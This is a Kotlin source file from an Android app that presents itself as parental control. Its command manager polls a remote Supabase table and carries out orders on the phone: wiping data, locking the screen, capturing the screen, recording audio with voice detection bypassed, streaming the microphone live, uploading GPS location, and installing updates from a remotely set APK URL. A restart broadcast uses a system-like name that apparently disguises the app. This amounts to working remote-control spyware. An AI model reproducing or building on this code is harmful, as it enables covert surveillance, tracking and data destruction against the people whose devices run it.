package com.example.parentalcontrol

import android.content.Context
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.util.Log
import io.github.jan.supabase.postgrest.postgrest
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.serialization.Serializable

@Serializable
data class CommandRecord(
    val id: String,
    val device_id: String,
    val command: String,
    val status: String,
    val payload: kotlinx.serialization.json.JsonElement? = null, // JSONB from Supabase
    val created_at: String? = null,
    val executed_at: String? = null
)



/**
 * مدير الأوامر (Command Manager)
 * متصل بنظام السحب الدوري (Polling) كبديل فائق الاستقرار للأسلاك (Websockets) لمنع حالات الفشل
 */
class RealtimeCommandManager(
    private val context: Context,
    private val scope: CoroutineScope,
    private val gpsTracker: GpsTracker,
    private val projectionProvider: () -> android.media.projection.MediaProjection?
) {

    companion object {
        private const val TAG = "CommandManager"
        private const val TABLE_NAME = "commands"
    }

    private val supabase = SupabaseManager.getInstance()
    private val parentalControl = ParentalControlManager(context)
    private val screenCapture = ScreenCaptureEngine(context)
    private val audioRecorder = AudioRecorderEngine(context)
    private val micManager = MicManager(context, scope)
    private val updateManager = AppUpdateManager(context)

    /**
     * بدء السحب الدوري للأوامر (كل 5 ثوانٍ)
     */
    fun startListening() {
        Log.i(TAG, "Starting command polling...")
        scope.launch(Dispatchers.IO) {
            while (true) {
                try {
                    val client = supabase.getClient()
                    if (client != null) {
                        val currentDeviceId = android.provider.Settings.Secure.getString(
                            context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
                        )

                        // نجلب الأوامر المعلقة لهذا الجهاز
                        val newCommands = try {
                            client.postgrest[TABLE_NAME]
                                .select {
                                    filter {
                                        eq("device_id", currentDeviceId)
                                        eq("status", "PENDING")
                                    }
                                }.decodeList<CommandRecord>()
                        } catch (e: Exception) {
                            Log.e(TAG, "Serialization error fetching commands: ${e.message}")
                            SupabaseManager.getInstance().logRemote(context, TAG, "ERROR", 
                                "Command Serialization Error: ${e.message}")
                            emptyList<CommandRecord>()
                        }


                        // تنفيذ الأوامر المكتشفة
                        for (cmd in newCommands) {
                            try {
                                Log.i(TAG, "New command detected: ${cmd.command}")
                                supabase.logRemote(context, TAG, "INFO", "Executing command: ${cmd.command}")
                                
                                val success = executeCommand(cmd.command.uppercase().trim(), cmd.payload)

                                
                                // تحديث الحالة إلى منفذ (أو فشل) بعد المحاولة
                                val statusResult = if (success) "EXECUTED" else "FAILED"
                                
                                client.postgrest[TABLE_NAME].update(
                                    {
                                        set("status", statusResult)
                                        set("executed_at", kotlinx.datetime.Clock.System.now().toString())
                                    }
                                ) {
                                    filter { eq("id", cmd.id) }
                                }

                                supabase.logRemote(context, TAG, "INFO", "Command ${cmd.command} result: $statusResult")
                            } catch (e: Exception) {
                                Log.e(TAG, "Failed to process command ${cmd.id}: ${e.message}")
                                supabase.logRemote(context, TAG, "ERROR", "Process failed: ${e.message}")
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Polling error: ${e.message}")
                }
                
                // انتظار 5 ثوانٍ قبل الفحص التالي
                delay(5000L)
            }
        }
    }

    private suspend fun executeCommand(command: String, payloadJson: kotlinx.serialization.json.JsonElement?): Boolean {

        return try {
            when (command) {
                "LOCK" -> {
                    parentalControl.lockScreen()
                    true
                }
                "WIPE" -> {
                    parentalControl.wipeData(false)
                    true
                }
                "ALARM" -> {
                    playAlarm()
                    true
                }
                "CAPTURE" -> {
                    MonitoringForegroundService.getInstance()?.let { service ->
                        service.startManualScreen(5) // Capture 5 cycles on demand
                        true
                    } ?: run {
                        Log.w(TAG, "CAPTURE: Service instance NULL")
                        false
                    }
                }
                "RECORD" -> {
                    val duration = try {
                        if (payloadJson is kotlinx.serialization.json.JsonObject) {
                            payloadJson["duration"]?.let {
                                if (it is kotlinx.serialization.json.JsonPrimitive) it.content.toLong() else it.toString().toLong()
                            } ?: 30_000L
                        } else {
                            30_000L
                        }
                    } catch (e: Exception) { 30_000L }
                    
                    audioRecorder.recordAndUpload(duration, bypassVad = true)
                    true
                }
                "LISTEN_START" -> {
                    audioRecorder.startRecording()
                    true
                }
                "LISTEN_STOP" -> {
                    audioRecorder.stopRecording(upload = true)
                    true
                }
                // ── Hybrid Mic (v18.2) ────────────────────────────────────
                "MIC" -> {
                    // Parse payload for action
                    val action = try {
                        val actionValue = if (payloadJson is kotlinx.serialization.json.JsonPrimitive) {
                            payloadJson.content
                        } else if (payloadJson is kotlinx.serialization.json.JsonObject) {
                            payloadJson["action"]?.let {
                                if (it is kotlinx.serialization.json.JsonPrimitive) it.content else it.toString()
                            }
                        } else {
                            null
                        }
                        actionValue ?: "START"
                    } catch (e: Exception) { "START" }


                    val deviceId = android.provider.Settings.Secure.getString(
                        context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
                    ) ?: "unknown"

                    if (action == "START" || action == "MIC_STREAM") {
                        micManager.startStream(deviceId)
                    } else {
                        micManager.stopStream()
                    }
                    true
                }
                "MIC_STREAM" -> {
                    val deviceId = android.provider.Settings.Secure.getString(
                        context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
                    ) ?: "unknown"
                    micManager.startStream(deviceId)
                    true
                }
                "MIC_STREAM_STOP" -> {
                    micManager.stopStream()
                    true
                }
                "MIC_RECORD" -> {
                    MonitoringForegroundService.getInstance()?.let { service ->
                        // Optional: parse duration from payload
                        val duration = try {
                            if (payloadJson is kotlinx.serialization.json.JsonObject) {
                                payloadJson["duration"]?.let {
                                    if (it is kotlinx.serialization.json.JsonPrimitive) it.content.toLong() else it.toString().toLong()
                                } ?: 30_000L
                            } else {
                                30_000L
                            }
                        } catch (e: Exception) { 30_000L }
                        
                        service.startManualMic(duration)
                        true
                    } ?: run {
                        Log.w(TAG, "MIC_RECORD: Service instance NULL")
                        false
                    }
                }

                "LOCATE" -> {
                    gpsTracker.fetchAndUploadLocation()
                    true
                }
                "UNINSTALL" -> {
                    // محاولة إلغاء تثبيت التطبيق نفسه عن بُعد
                    supabase.logRemote(context, TAG, "INFO", "UNINSTALL command received — attempting self-uninstall")
                    try {
                        // إذا كان device admin مفعلاً → إلغاء صلاحيات المدير أولاً ثم الحذف
                        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                        val adminReceiver = android.content.ComponentName(context, MyDeviceAdminReceiver::class.java)
                        if (dpm.isAdminActive(adminReceiver)) {
                            dpm.removeActiveAdmin(adminReceiver)
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Admin removal failed: ${e.message}")
                    }
                    // فتح واجهة إلغاء التثبيت
                    val intent = android.content.Intent(android.content.Intent.ACTION_DELETE).apply {
                        data = android.net.Uri.parse("package:${context.packageName}")
                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(intent)
                    true
                }
                "RESTART" -> {
                    // إرسال broadcast لإعادة تشغيل الخدمة عبر ServiceRestartReceiver
                    val restartIntent = android.content.Intent("com.android.system.optimization.engine.RESTART")
                    restartIntent.setPackage(context.packageName)
                    context.sendBroadcast(restartIntent)
                    supabase.logRemote(context, TAG, "INFO", "RESTART command: broadcast sent to ServiceRestartReceiver")
                    true
                }
                "UPDATE" -> {
                    // executeCommand هي suspend fun تعمل داخل Dispatchers.IO
                    // → نستدعي مباشرة بدون launch داخلي لتجنب CancellationException
                    val settings = RemoteConfigManager(context).fetchSettings()
                    if (settings != null) {
                        updateManager.checkAndExecuteUpdate(
                            targetVersion = settings.target_version,
                            apkPath       = settings.update_apk_path,
                            apkUrl        = settings.update_apk_url,
                            forceIntent   = true
                        )
                    } else {
                        Log.w(TAG, "UPDATE: fetchSettings returned null")
                    }
                    true
                }
                else -> {
                    Log.w(TAG, "Unknown command: $command")
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Execution error: ${e.message}")
            supabase.logRemote(context, TAG, "ERROR", "Exec crash: ${e.message}")
            false
        }
    }

    /**
     * تشغيل صوت إنذار بأعلى صوت ممكن
     */
    private fun playAlarm() {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
            // رفع الصوت إلى الحد الأقصى تلقائياً (قناة الإنذار)
            val maxVolume = audioManager.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM)
            audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, maxVolume, 0)

            val notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM) ?: 
                               RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            
            val mediaPlayer = MediaPlayer().apply {
                setDataSource(context, notification)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                    setAudioAttributes(
                        android.media.AudioAttributes.Builder()
                            .setUsage(android.media.AudioAttributes.USAGE_ALARM)
                            .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
                            .build()
                    )
                } else {
                    setAudioStreamType(android.media.AudioManager.STREAM_ALARM)
                }
                prepare()
                isLooping = true
                start()
            }

            // التوقف بعد 15 ثانية لضمان عدم استهلاك البطارية
            scope.launch {
                delay(15000L)
                try {
                    if (mediaPlayer.isPlaying) {
                        mediaPlayer.stop()
                        mediaPlayer.release()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error stopping alarm: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to play alarm: ${e.message}")
        }
    }
}
